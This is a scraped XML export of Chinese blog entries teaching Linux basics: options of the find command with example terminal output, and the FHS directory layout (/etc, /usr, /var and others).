&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以 root:x:0:root,linuxsir 为例：用户组 root ，x 是密码段，表示没有设置木马，GID 是 0 ，root 用户组下包括 root、linuxsir 以及 GID 为0的其它用户。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[find 命令的参数详解]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F22.%20find%20%E5%91%BD%E4%BB%A4%E7%9A%84%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[find 命令的参数详解-&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;find 一些常用参数的一些常用实例和一些具体用法和注意事项。 1.使用 name 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件名选项是 find 命令最常用的选项，要么单独使用该选项，要么和其他选项一起使用。可以使用某种文件名模式来匹配文件，记住要用引号将文件名模式引起来。不管当前路径是什么，如果想要在自己的根目录 $HOME 中查找文件名符合 *.log 的文件，使用 ~ 作为 ‘pathname’ 参数，波浪号 ~ 呆了了 $HOME 目录。 1find ~ -name "*.log" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想要在当前目录及子目录中查找所有的 ‘*.log’ 文件，可以用： 1find . -name "*.log" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想要在当前目录及子目录中查找文件名以一个大写字母开头的文件，可以用： 1find . -name "[A-Z]*" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想要在 /etc 目录中查找文件名以 host 开头的文件，可以用： 1find /etc -name "host*" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想要查找 $HOME 目录中的文件，可以用： 1find ~ -name "*" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或 1find . -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要想让系统高负荷运行，就从根目录开始查找所有的文件 1find / -name "*" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想在当前目录查找文件名以一个个小写字母开头，最后是4到9加上 .log 结束的文件： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "[a-z]*[4-9].log" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log-rw-r--r-- 1 root root 0 11-13 06:03 log2014.log-rw-r--r-- 1 root root 0 11-13 06:06 log2015.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 06:08 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# find . -name "[a-z]*[4-9].log" -print./log2014.log./log2015.log./test4/log2014.log[root@localhost test]# 2.用 perm 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按照文件权限模式用 -perm 选项，按文件权限模式来查找文件的话。最好使用八进制的权限表示法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如在当前目录下查找文件权限位为755的文件，即文件属主可以读、写、执行，其他用户可以读、执行的文件，可以用： 1234567891011[root@localhost test]# find . -perm 755 -print../scf./scf/lib./scf/service./scf/service/deploy./scf/service/deploy/product./scf/service/deploy/info./scf/doc./scf/bin[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有一种表达方法：在八进制数字前面要加一个横杠 - ，表示都匹配，如 -007 就相当于 777， -005 相当于 555。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -perm -005 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log-rw-r--r-- 1 root root 0 11-13 06:03 log2014.log-rw-r--r-- 1 root root 0 11-13 06:06 log2015.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 06:08 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# find . -perm -005../test4./scf./scf/lib./scf/service./scf/service/deploy./scf/service/deploy/product./scf/service/deploy/info./scf/doc./scf/bin./test3[root@localhost test]# 3.忽略某个目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果在查找文件时希望忽略某个目录，因为知道那个目录中没有索要查找的文件，那么可以使用 -prune 选项来指出需要忽略的目录。在使用 -prune 选项时要当心，因为如果同时使用了 -depth 选项，那么 -prune 选项就会被 find 命令忽略。如果希望在 test 目录下查找文件，但不希望在 test/test3 目录下查找，可以用： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find test -path “test/test3” -prune -o -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819[root@localhost soft]# find test -path "test/test3" -prune -o -printtesttest/log2014.logtest/log2015.logtest/test4test/test4/log2014.logtest/test4/log2013.logtest/test4/log2012.logtest/scftest/scf/libtest/scf/servicetest/scf/service/deploytest/scf/service/deploy/producttest/scf/service/deploy/infotest/scf/doctest/scf/bintest/log2013.logtest/log2012.log[root@localhost soft]# 4.使用 find 查找文件的时候怎么不开某个文件目录实例1：在 test 目录下查找不再 test4 子目录之内的所有文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find test -path "test/test4" -prune -o -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526272829303132333435[root@localhost soft]# find testtesttest/log2014.logtest/log2015.logtest/test4test/test4/log2014.logtest/test4/log2013.logtest/test4/log2012.logtest/scftest/scf/libtest/scf/servicetest/scf/service/deploytest/scf/service/deploy/producttest/scf/service/deploy/infotest/scf/doctest/scf/bintest/log2013.logtest/log2012.logtest/test3[root@localhost soft]# find test -path "test/test4" -prune -o -printtesttest/log2014.logtest/log2015.logtest/scftest/scf/libtest/scf/servicetest/scf/service/deploytest/scf/service/deploy/producttest/scf/service/deploy/infotest/scf/doctest/scf/bintest/log2013.logtest/log2012.logtest/test3[root@localhost soft]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 1find [-path ..] [expression] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在路径列表的后面的是表达式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-path “test” -prune -o -print 是 -path “test” -a -prune -o -print 的简写表达式按顺序求值， -a 和 -o 都是短路求值，与 shell 的 &amp;&amp; 和 || 类似。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果 -path “test” 为真，则求值 -prune ，-prune 返回真，与逻辑表达式为真；否则不求值 -prune ，与逻辑表达式为假。如果 -path “test” -a -prune 为假，则求值 -print ，-print 返回真，或逻辑表达式为真；否则不求值 -print ，或逻辑表达式为真。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个表达式组合特例可以用伪码写为： 12345if -path "test"then -pruneelse -print 实例2：避开多个文件夹&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find test \( -path test/test4 -o -path test/test3 \) -prune -o -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost soft]# find test \( -path test/test4 -o -path test/test3 \) -prune -o -printtesttest/log2014.logtest/log2015.logtest/scftest/scf/libtest/scf/servicetest/scf/service/deploytest/scf/service/deploy/producttest/scf/service/deploy/infotest/scf/doctest/scf/bintest/log2013.logtest/log2012.log[root@localhost soft]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;圆括号表示表达式的结合。 \ 表示引用，即指示 shell 不对后面的字符作特殊解释，而留给 find 命令去解释其意义。 实例3：查找某一确定文件，-name 等选项加在 -o 之后&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find test \(-path test/test4 -o -path test/test3 \) -prune -o -name "*.log" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost soft]# find test \( -path test/test4 -o -path test/test3 \) -prune -o -name "*.log" -printtest/log2014.logtest/log2015.logtest/log2013.logtest/log2012.log[root@localhost soft]# 5.使用 user 和 nouser 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按文件属主查找文件： 实例1：在 $HOME 目录中查找文件属主为 peida 的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find ~ -user peida -print 实例2：在 /etc 目录下查找文件属主为 peida 的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find /etc -user peida -print 实例3：为了查找属主账户已经被删除的文件，可以使用 -nouser 选项。在 /home 目录下查找所有的这类文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find /home -nouser -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就能够找到那些属主在 /etc/passwd 文件中没有有效账户的文件。在使用 -nouser 选项时，不必给出用户名；find 命令能够完成相应的工作。 6.使用 group 和 nogroup 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;就像 user 和 nouser 选项一样，针对文件所属于的用户组，find 命令也具有同样的选项，为了在 /apps 目录下查找属于 gem 用户组的文件，可以用： 1find /apps -group gem -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要查找没有有效所属用户组的所有文件，可以使用 nogroup 选项。下面的 find 命令从文件系统的根目录处查找这样的文件： 1find / -nogroup -print 7.按照更改时间或访问时间等查找文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果希望按照更改时间来查找文件，可以使用 mtime 、atime 或 ctime 选项。如果系统突然没有可用空间了，很有可能某一个文件的长度在期间增长迅速，这是就可以用 mtime 选项来查找这样的文件。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用减号 - 来限定更改时间在距今 n 日之内的文件，而用加好 + 来限定更改时间在距今 n 日以前的文件。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;希望在系统根目录下查找更改时间在5日以内的文件，可以用： 1find / -mtime -5 print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了在 /var/adm 目录下查找更改时间在3日以前的文件，可以用： 1find /var/adm -mtime +3 -print 8.查找比某个文件新或旧的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果希望查找更改时间比某个文件新但比另一个文件旧的所有文件可以使用 -newer 选项。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它的一般形式为： 1newest_file_name ! oldest_file_name &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中，！ 是逻辑非符号。 实例1： 查找更改时间比文件 log2012.log 新但比文件 log2017.log 旧的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find -newer log2012.log ! -newer log2017.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log-rw-r--r-- 1 root root 0 11-13 06:03 log2014.log-rw-r--r-- 1 root root 0 11-13 06:06 log2015.log-rw-r--r-- 1 root root 0 11-16 14:41 log2016.log-rw-r--r-- 1 root root 0 11-16 14:43 log2017.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 06:08 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# find -newer log2012.log ! -newer log2017.log../log2015.log./log2017.log./log2016.log./test3[root@localhost test]# 实例2：查找更改时间比 log2012.log 文件新的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -newer log2012.log -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost test]# find -newer log2012.log../log2015.log./log2017.log./log2016.log./test3[root@localhost test]# 9.使用 type 选项实例1：在 /etc 目录下查找所有的目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find /etc -type d -print 实例2：在当前目录下查找除目录意外的所有类型的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . ! -type d -print 实例3：在 /etc 目录下查找所有 负担好链接文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find /etc/-type l -print 使用 size 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以按照文件长度来查找文件，这里所指的文件长度既可以用块（block）来计量，也可以用字节来计量。以字节计量文件长度的表达形式为N c；以块计量文件长度只用数字表示即可。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在按照文件长度查找文件时，一般使用这种以字节表示的文件长度，在查看文件系统的大小，因为这时使用块来计量更容易转换。 实例1：在当前目录下查找文件长度大于1M字节的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -size +1000000c -print 实例2：在/home/apache 目录下查找文件长度恰好为100字节的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find /home/apache -size 100c -print 实例3：在当前目录下查找长度超过10块的文件，（一块等于512字节）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -size +10 -print 使用 depth 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在使用 find 命令时，可能希望先匹配所有的文件，再在子目录中查找。使用 depth 选项就可以使 find 命令这样做。这样做的一个原因就是，当在使用 find 命令想磁带上备份文件系统时，希望首先备份所有的 文件，其次再备份子目录中的文件。 实例1：find 命令从文件系统的根目录开始，查找一个名为 CON.FILE 的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "*.XC" -mount -print]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 目录结构]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F23.%20Linux%20%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[Linux 目录结构&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于每一个Linux学习者来说，了解Linux文件系统的目录结构，是学好Linux的至关重要的一步.，深入了解linux文件目录结构的标准和每个目录的详细功能，对于我们用好linux系统只管重要，下面我们就开始了解一下linux目录结构的相关知识。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当在使用Linux的时候，如果您通过ls –l / 就会发现，在/下包涵很多的目录，比如etc、usr、var、bin … … 等目录，而在这些目录中，我们进去看看，发现也有很多的目录或文件。文件系统在Linux下看上去就象树形结构，所以我们可以把文件系统的结构形象的称为 树形结构。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件系统的是用来组织和排列文件存取的，所以她是可见的，在Linux中，我们可以通过ls等工具来查看其结构，在Linux系统中，我们见到的都是树形结构；比如操作系统安装在一个文件系统中，他表现为由/ 起始的树形结构。linux文件系统的最顶端是/，我们称/为Linux的root，也就是 Linux操作系统的文件系统。Linux的文件系统的入口就是/，所有的目录、文件、设备都在/之下，/就是Linux文件系统的组织者，也是最上级的领导者。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于linux是开放源代码，各大公司和团体根据linux的核心代码做各自的操作，编程。这样就造成在根下的目录的不同。这样就造成个人不能使用他人的linux系统的PC。因为你根本不知道一些基本的配置，文件在哪里。。。这就造成了混乱。这就是FHS（Filesystem Hierarchy Standard ）机构诞生的原因。该机构是linux爱好者自发的组成的一个团体，主要是是对linux做一些基本的要求，不至于是操作者换一台主机就成了linux的‘文盲’。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根据FHS的官方文件指出， 他们的主要目的是希望让使用者可以了解到已安装软件通常放置于那个目录下， 所以他们希望独立的软件开发商、操作系统制作者、以及想要维护系统的用户，都能够遵循FHS的标准。 也就是说，FHS的重点在于规范每个特定的目录下应该要放置什么样子的数据而已。 这样做好处非常多，因为Linux操作系统就能够在既有的面貌下(目录架构不变)发展出开发者想要的独特风格。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;事实上，FHS是根据过去的经验一直再持续的改版的，FHS依据文件系统使用的频繁与否与是否允许使用者随意更动， 而将目录定义成为四种交互作用的形态，用表格来说有点像底下这样： &#160; 可分享的（shareable） 不可分享的（unshareables） 不变的（static） /usr(软件放置处） /etc（配置文件） &#160; /opt(第三方协力软件) /boot（开机与核心档） 可变动的（variable） /var/mail（使用者邮件信箱） /var/run（程序相关） &#160; /var/spool/news（新闻组） /var/lock（程序相关） 四种类型1.可分享的&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以分享给其他系统挂载的目录，所以包括执行文件与用户的邮件等数据，是能够分享给网络上其他主机挂载用的目录； 2.不可分享的&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;自己机器上面运作的装置文件或者是与程序有关的 socket 文件等，由于仅与自身机器有关，所以当然就不合适分享给其他主机了。 3.不变的&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有些数据是不回经常变动的，跟随着 distribution 而不变动。例如函式库、文件说明文件、系统管理员所管理的主机服务配置文件等等； 4.可变动的&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;经常改变的数据，例如登录文件、一般用户可自行收受的新闻组等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;事实上，FHS 针对目录树架构仅定义出三层目录底下应该放置什么数据而已，分别是底下这三个目录的定义： / (root, 根目录)：与开机系统有关；/usr (unix software resource)：与软件安装/执行有关；/var (variable)：与系统运作过程有关。一、根目录（/）的意义与内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根目录是整个系统最重要的一个目录，因为不但所有的目录都是由根目录衍生出来的， 同时根目录也与开机/还原/系统修复等动作有关。 由于系统开机时需要特定的开机软件、核心文件、开机所需程序、 函式库等等文件数据，若系统出现错误时，根目录也必须要包含有能够修复文件系统的程序才行。 因为根目录是这么的重要，所以在FHS的要求方面，他希望根目录不要放在非常大的分区， 因为越大的分区内你会放入越多的数据，如此一来根目录所在分区就可能会有较多发生错误的机会。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因此FHS标准建议：根目录(/)所在分区应该越小越好， 且应用程序所安装的软件最好不要与根目录放在同一个分区内，保持根目录越小越好。 如此不但效能较佳，根目录所在的文件系统也较不容易发生问题。说白了，就是根目录和Windows的C盘一个样。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根据以上原因，FHS认为根目录(/)下应该包含如下子目录： 目录 应防止档案内容 /bin 系统有很多放置执行档的目录，但/bin比较特殊。因为/bin放置的是在单人维护模式下还能够被操作的指令。在/bin底下的指令可以被root与一般帐号所使用，主要有：cat,chmod(修改权限), chown, date, mv, mkdir, cp, bash等等常用的指令。 /boot 主要放置开机会使用到的档案，包括Linux核心档案以及开机选单与开机所需设定档等等。Linux kernel常用的档名为：vmlinuz ，如果使用的是grub这个开机管理程式，则还会存在/boot/grub/这个目录。 /dev 在Linux系统上，任何装置与周边设备都是以档案的型态存在于这个目录当中。 只要通过存取这个目录下的某个档案，就等于存取某个装置。比要重要的档案有/dev/null, /dev/zero, /dev/tty , /dev/lp, / dev/hd, /dev/sd*等等 /etc 系统主要的设定档几乎都放置在这个目录内，例如人员的帐号密码档、各种服务的启始档等等。 一般来说，这个目录下的各档案属性是可以让一般使用者查阅的，但是只有root有权力修改。 FHS建议不要放置可执行档(binary)在这个目录中。 比较重要的档案有：/etc/inittab, /etc/init.d/, /etc/modprobe.conf, /etc/X11/, /etc/fstab, /etc/sysconfig/等等。 另外，其下重要的目录有：/etc/init.d/ ：所有服务的预设启动script都是放在这里的，例如要启动或者关闭iptables的话： /etc/init.d/iptables start、/etc/init.d/ iptables stop/etc/xinetd.d/ ：这就是所谓的super daemon管理的各项服务的设定档目录。/etc/X11/ ：与X Window有关的各种设定档都在这里，尤其是xorg.conf或XF86Config这两个X Server的设定档。 /home 这是系统预设的使用者家目录(home directory)。 在你新增一个一般使用者帐号时，预设的使用者家目录都会规范到这里来。比较重要的是，家目录有两种代号： ~ ：代表当前使用者的家目录，而 ~guest：则代表用户名为guest的家目录。 /lib 系统的函式库非常的多，而/lib放置的则是在开机时会用到的函式库，以及在/bin或/sbin底下的指令会呼叫的函式库而已 。 什么是函式库呢？妳可以将他想成是外挂，某些指令必须要有这些外挂才能够顺利完成程式的执行之意。 尤其重要的是/lib/modules/这个目录，因为该目录会放置核心相关的模组(驱动程式)。 /media media是媒体的英文，顾名思义，这个/media底下放置的就是可移除的装置。 包括软碟、光碟、DVD等等装置都暂时挂载于此。 常见的档名有：/media/floppy, /media/cdrom等等。 /mnt 如果妳想要暂时挂载某些额外的装置，一般建议妳可以放置到这个目录中。在古早时候，这个目录的用途与/media相同啦。 只是有了/media之后，这个目录就用来暂时挂载用了。 /opt 这个是给第三方协力软体放置的目录 。 什么是第三方协力软体啊？举例来说，KDE这个桌面管理系统是一个独立的计画，不过他可以安装到Linux系统中，因此KDE的软体就建议放置到此目录下了。 另外，如果妳想要自行安装额外的软体(非原本的distribution提供的)，那么也能够将你的软体安装到这里来。 不过，以前的Linux系统中，我们还是习惯放置在/usr/local目录下。 /root 系统管理员(root)的家目录。 之所以放在这里，是因为如果进入单人维护模式而仅挂载根目录时，该目录就能够拥有root的家目录，所以我们会希望root的家目录与根目录放置在同一个分区中。 /sbin Linux有非常多指令是用来设定系统环境的，这些指令只有root才能够利用来设定系统，其他使用者最多只能用来查询而已。放在/sbin底下的为开机过程中所需要的，里面包括了开机、修复、还原系统所需要的指令。至于某些伺服器软体程式，一般则放置到/usr/sbin/当中。至于本机自行安装的软体所产生的系统执行档(system binary)，则放置到/usr/local/sbin/当中了。常见的指令包括：fdisk, fsck, ifconfig, init, mkfs等等。 /srv srv可以视为service的缩写，是一些网路服务启动之后，这些服务所需要取用的资料目录。 常见的服务例如WWW, FTP等等。 举例来说，WWW伺服器需要的网页资料就可以放置在/srv/www/里面。呵呵，看来平时我们编写的代码应该放到这里了。 /tmp 这是让一般使用者或者是正在执行的程序暂时放置档案的地方。这个目录是任何人都能够存取的，所以你需要定期的清理一下。当然，重要资料不可放置在此目录啊。 因为FHS甚至建议在开机时，应该要将/tmp下的资料都删除。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;事实上 FHS 针对根目录所定义的标准就仅限于上表，不过仍旧有些目录也需要了解，具体如下： 目录 应放置文件内容 /lost + found 这个目录是使用标准的ext2/ext3档案系统格式才会产生的一个目录，目的在于当档案系统发生错误时，将一些遗失的片段放置到这个目录下。 这个目录通常会在分割槽的最顶层存在，例如你加装一个硬盘于/disk中，那在这个系统下就会自动产生一个这样的目录/disk/lost+found /proc 这个目录本身是一个虚拟文件系统(virtual filesystem)喔。 他放置的资料都是在内存当中，例如系统核心、行程资讯(process)（是进程吗?）、周边装置的状态及网络状态等等。因为这个目录下的资料都是在记忆体（内存）当中，所以本身不占任何硬盘空间。比较重要的档案（目录）例如： /proc/cpuinfo, /proc/dma, /proc/interrupts, /proc/ioports, /proc/net/*等等。呵呵，是虚拟内存吗[guest]？ /sys 这个目录其实跟/proc非常类似，也是一个虚拟的档案系统，主要也是记录与核心相关的资讯。 包括目前已载入的核心模组与核心侦测到的硬体装置资讯等等。 这个目录同样不占硬盘容量。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了这些目录的内容文件，另外要注意的是，因为根目录与开机有关，开机过程中仅有根目录会被挂载，其他分区则是在开机完成之后才会持续的进行挂载的行为。就是因为如此，因此根目录下与开机过程有关的目录，就不能够与根目录放到不同的分区去。哪些目录不可与根分区分开呢： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc：配置文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/bin：重要执行档 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/dev：所需要的装置文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/lib：执行档所需的函式库与核心所需的模块 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/sbin：重要的系统执行文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这五个目录千万不可与根目录分开在不同的分区。 二、/usr 的意义与内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;依据FHS的基本定义，/usr里面放置的数据属于可分享的与不可变动的(shareable, static)， 如果你知道如何透过网络进行分区的挂载(例如在服务器篇会谈到的NFS服务器)，那么/usr确实可以分享给局域网络内的其他主机来使用喔。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/usr不是user的缩写，其实usr是Unix Software Resource的缩写， 也就是Unix操作系统软件资源所放置的目录，而不是用户的数据啦。这点要注意。 FHS建议所有软件开发者，应该将他们的数据合理的分别放置到这个目录下的次目录，而不要自行建立该软件自己独立的目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为是所有系统默认的软件(distribution发布者提供的软件)都会放置到/usr底下，因此这个目录有点类似Windows 系统的C:\Windows\ + C:\Program files\这两个目录的综合体，系统刚安装完毕时，这个目录会占用最多的硬盘容量。 一般来说，/usr的次目录建议有底下这些： 目录 应放置文件内容 /usr/X11R6/ 为X Window System重要数据所放置的目录，之所以取名为X11R6是因为最后的X版本为第11版，且该版的第6次释出之意。 /usr/bin/ 绝大部分的用户可使用指令都放在这里。请注意到他与/bin的不同之处。(是否与开机过程有关) /usr/include/ c/c++等程序语言的档头(header)与包含档(include)放置处，当我们以tarball方式 (*.tar.gz 的方式安装软件)安装某些数据时，会使用到里头的许多包含档。 /usr/lib/ 包含各应用软件的函式库、目标文件(object file)，以及不被一般使用者惯用的执行档或脚本(script)。 某些软件会提供一些特殊的指令来进行服务器的设定，这些指令也不会经常被系统管理员操作， 那就会被摆放到这个目录下啦。要注意的是，如果你使用的是X86_64的Linux系统， 那可能会有/usr/lib64/目录产生 /usr/local/ 统管理员在本机自行安装自己下载的软件(非distribution默认提供者)，建议安装到此目录， 这样会比较便于管理。举例来说，你的distribution提供的软件较旧，你想安装较新的软件但又不想移除旧版， 此时你可以将新版软件安装于/usr/local/目录下，可与原先的旧版软件有分别啦。 你可以自行到/usr/local去看看，该目录下也是具有bin, etc, include, lib…的次目录 /usr/sbin/ 非系统正常运作所需要的系统指令。最常见的就是某些网络服务器软件的服务指令(daemon) /usr/share/ 放置共享文件的地方，在这个目录下放置的数据几乎是不分硬件架构均可读取的数据， 因为几乎都是文本文件嘛。在此目录下常见的还有这些次目录：/usr/share/man：联机帮助文件;/usr/share/doc：软件杂项的文件说明;/usr/share/zoneinfo：与时区有关的时区文件 /usr/src/ 一般原始码建议放置到这里，src有source的意思。至于核心原始码则建议放置到/usr/src/linux/目录下。 三、/var 的意义与内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果/usr是安装时会占用较大硬盘容量的目录，那么/var就是在系统运作后才会渐渐占用硬盘容量的目录。 因为/var目录主要针对常态性变动的文件，包括缓存(cache)、登录档(log file)以及某些软件运作所产生的文件， 包括程序文件(lock file, run file)，或者例如MySQL数据库的文件等等。常见的次目录有： 目录 应放置文件内容 /var/cache/ 应用程序本身运作过程中会产生的一些暂存档 /var/lib/ 程序本身执行的过程中，需要使用到的数据文件放置的目录。在此目录下各自的软件应该要有各自的目录。 举例来说，MySQL的数据库放置到/var/lib/mysql/而rpm的数据库则放到/var/lib/rpm去 /var/lock/ 某些装置或者是文件资源一次只能被一个应用程序所使用，如果同时有两个程序使用该装置时， 就可能产生一些错误的状况，因此就得要将该装置上锁(lock)，以确保该装置只会给单一软件所使用。 举例来说，刻录机正在刻录一块光盘，你想一下，会不会有两个人同时在使用一个刻录机烧片？ 如果两个人同时刻录，那片子写入的是谁的数据？所以当第一个人在刻录时该刻录机就会被上锁， 第二个人就得要该装置被解除锁定(就是前一个人用完了)才能够继续使用 /var/log/ 非常重要。这是登录文件放置的目录。里面比较重要的文件如/var/log/messages, /var/log/wtmp(记录登入者的信息)等。 /var/mail/ 放置个人电子邮件信箱的目录，不过这个目录也被放置到/var/spool/mail/目录中，通常这两个目录是互为链接文件。 /var/run/ 某些程序或者是服务启动后，会将他们的PID放置在这个目录下 /var/spool/ 这个目录通常放置一些队列数据，所谓的“队列”就是排队等待其他程序使用的数据。 这些数据被使用后通常都会被删除。举例来说，系统收到新信会放置到/var/spool/mail/中， 但使用者收下该信件后该封信原则上就会被删除。信件如果暂时寄不出去会被放到/var/spool/mqueue/中， 等到被送出后就被删除。如果是工作排程数据(crontab)，就会被放置到/var/spool/cron/目录中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于 FHS 仅是定义出最上层(/)及次层(/usr, /var)的目录内容应该要放置的文件或目录数据， 因此，在其他次目录层级内，就可以随开发者自行来配置了。 四、目录树（directory tree）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Linux底下，所有的文件与目录都是由根目录开始的。那是所有目录与文件的源头, 然后再一个一个的分支下来，因此，我们也称这种目录配置方式为：目录树(directory tree), 这个目录树的主要特性有： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目录树的启始点为根目录 (/, root)； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每一个目录不止能使用本地端的 partition 的文件系统，也可以使用网络上的 filesystem 。举例来说， 可以利用 Network File System (NFS) 服务器挂载某特定目录等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每一个文件在此目录树中的文件名(包含完整路径)都是独一无二的。 